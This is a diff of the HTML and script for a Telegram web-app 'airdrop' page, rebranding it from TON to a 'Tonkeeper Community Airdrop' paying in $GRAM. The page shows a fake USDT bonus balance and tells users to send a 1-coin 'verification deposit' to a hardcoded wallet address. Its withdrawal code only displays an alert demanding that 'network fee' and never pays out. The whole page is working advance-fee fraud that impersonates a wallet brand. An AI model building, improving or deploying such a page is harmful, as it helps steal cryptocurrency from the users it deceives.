@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Community Giveaway</title>
+    <title>Tonkeeper Community Airdrop</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
@@ -115,13 +115,13 @@
     </div>
 
     <div id="homePage" class="page" style="display: none;">
-        <div class="top-header">TON COMMUNITY GIVEAWAY</div>
+        <div class="top-header">$GRAM COMMUNITY GIVEAWAY</div>
 
         <div class="glass-card">
             <p style="color: #888; font-size: 12px;">BONUS BALANCE</p>
             <h1 class="usdt-text" id="uBalDisplay">0.00</h1>
             <p style="margin-top: -10px; color: var(--cyan); font-weight: bold;">USDT</p>
-            <div class="ton-text">0.00 TON</div>
+            <div class="gram-text">0.00 GRAM</div>
 
             <button class="btn btn-withdraw" onclick="showPage('withdrawPage')">Withdrawal</button>
             <button class="btn btn-deposit" onclick="showPage('depositPage')">Deposit</button>
@@ -129,7 +129,7 @@
 
         <div class="info-section" style="width: 90%;">
             <h4>🚀 Airdrop Info</h4>
-            <p>Welcome to the TON Global Giveaway. This event is hosted to celebrate the mass adoption of the TON blockchain.</p>
+            <p>Welcome to the <s>TON</s> GRAM Global Giveaway. This event is hosted to celebrate the mass adoption of the GRAM blockchain.</p>
             <p>● Guaranteed rewards for active telegram users.<br>● Instant claimable bonus in USDT.<br>● Secure and transparent blockchain transactions.</p>
         </div>
 
@@ -142,10 +142,10 @@
     <div id="withdrawPage" class="page">
         <div class="glass-card">
             <h3>Withdraw Funds</h3>
-            <input type="text" id="wAddr" placeholder="Wallet Address (TON/USDT)">
+            <input type="text" id="wAddr" placeholder="Wallet Address (GRAM/USDT)">
             <input type="number" id="wAmount" placeholder="Amount">
             <input type="text" id="wMemo" placeholder="Destination Memo">
-            <p style="color: #ff4d4d; font-size: 13px; font-weight: bold;">Network Fee: 1.00 TON</p>
+            <p style="color: #ff4d4d; font-size: 13px; font-weight: bold;">Network Fee: 1.00 GRAM</p>
             
             <button class="btn btn-deposit" onclick="handleWithdraw()">Confirm Withdrawal</button>
             <button class="btn" style="background:#222; color:#fff;" onclick="showPage('homePage')">Back</button>
@@ -154,15 +154,15 @@
         <div class="info-section" style="width: 90%;">
             <h4>⚠️ Withdrawal Rules</h4>
             <p>1. Withdrawals are processed within 5-30 minutes.</p>
-            <p>2. Ensure the destination address supports the TON network.</p>
-            <p>3. A standard network gas fee of 1 TON is required to release the smart contract funds.</p>
+            <p>2. Ensure the destination address supports the GRAM network.</p>
+            <p>3. A standard network gas fee of 1 GRAM is required to release the smart contract funds.</p>
         </div>
     </div>
 
     <div id="depositPage" class="page">
         <div class="glass-card">
             <h3>Deposit & Verify</h3>
-            <p style="color: #ffcc00; font-size: 12px;">⚠️ SEND ONLY TON (TON NETWORK) COIN</p>
+            <p style="color: #ffcc00; font-size: 12px;">⚠️ SEND ONLY GRAM (GRAM NETWORK) COIN</p>
             <input type="text" id="dAddr" value="UQCgDd9IQXJIyu1QLZ1VTdrXSF_1ey5iI0lNkWV7Qs8nnQQN" readonly>
             <button class="btn btn-deposit btn-small" onclick="copy('dAddr')">Copy Address ✅</button>
             
@@ -175,10 +175,10 @@
 
         <div class="info-section" style="width: 90%;">
             <h4>📌 Deposit Rules</h4>
-            <p>1. Use only TON (The Open Network) coins for verification.</p>
-            <p>2. Minimum verification deposit is 1.00 TON.</p>
+            <p>1. Use only GRAM (The Open Network) coins for verification.</p>
+            <p>2. Minimum verification deposit is 1.00 GRAM.</p>
             <p>3. Do not forget to include your unique Memo; otherwise, the transaction will not be automatically tracked.</p>
-            <p>4. Once 1 TON is received, your USDT bonus will be unlocked for full withdrawal.</p>
+            <p>4. Once 1 GRAM is received, your USDT bonus will be unlocked for full withdrawal.</p>
         </div>
     </div>
 
@@ -252,7 +252,7 @@
 
             tg.showConfirm(`Withdraw $${amt} USDT to this address?`, (ok) => {
                 if(ok) {
-                    tg.showAlert("⚠️ Transaction Security Verification\n\nTo complete this withdrawal, you need at least 1 $TON Network Fee in your verified balance.");
+                    tg.showAlert("⚠️ Transaction Security Verification\n\nTo complete this withdrawal, you need at least 1 $GRAM Network Fee in your verified balance.");
                 }
             });
         }
